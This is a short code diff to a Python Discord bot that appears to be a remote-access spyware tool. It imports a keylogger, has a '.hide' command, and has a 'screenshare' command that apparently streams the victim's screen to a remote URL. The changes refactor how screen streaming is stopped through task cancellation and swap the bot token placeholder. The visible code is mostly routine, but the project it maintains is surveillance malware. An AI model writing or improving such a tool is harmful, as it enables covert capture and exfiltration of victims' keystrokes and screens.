@@ -8,7 +8,7 @@ from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'token here'
+TOKEN = 'TOKEN'
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -533,6 +533,9 @@ async def screenshare(ctx: commands.Context, url=None):
                     if response.status != 200:
                         pass
                 await asyncio.sleep(0.05)
+    except asyncio.CancelledError:
+        await ctx.send("stopped webstreaming!")
+        raise
     except asyncio.TimeoutError:
         await asyncio.sleep(0.1)
     except aiohttp.ClientError as e:
@@ -545,11 +548,14 @@ async def screenshare(ctx: commands.Context, url=None):
             del activeStreaming[ctx.channel.id]
 
 async def stopsharing(ctx: commands.Context):
-    if ctx.channel.id in activeStreaming and activeStreaming[ctx.channel.id]:
-        activeStreaming[ctx.channel.id] = False
-        await ctx.send("stopping webstream..")
+    if ctx.channel.id in activeStreaming:
+        task = activeStreaming[ctx.channel.id]
+        task.cancel()
+        await ctx.send("stopping webstreaming..")
+        return True
     else:
-        await ctx.send("no active webstreaming here!")
+        await ctx.send("no active webstreaming session here!")
+        return False
 
 @bot.event
 async def on_ready():
@@ -704,16 +710,7 @@ async def on_message(message):
         elif command == ".hide":
             await hide(ctx)
         elif command == ".stopsharing":
-            if ctx.channel.id in activeStreaming:
-                task = activeStreaming[ctx.channel.id]
-
-                if isinstance(task, asyncio.Task):
-                    task.cancel()
-                if ctx.channel.id in activeStreaming:
-                    activeStreaming[ctx.channel.id]
-                    await ctx.send("stopping webstream..")
-                else:
-                    await ctx.send("no active webstreaming here!")
+            await stopsharing(ctx)
         else:
             await ctx.send(f"unknown command `{command}`, type `.help` for help")
             return
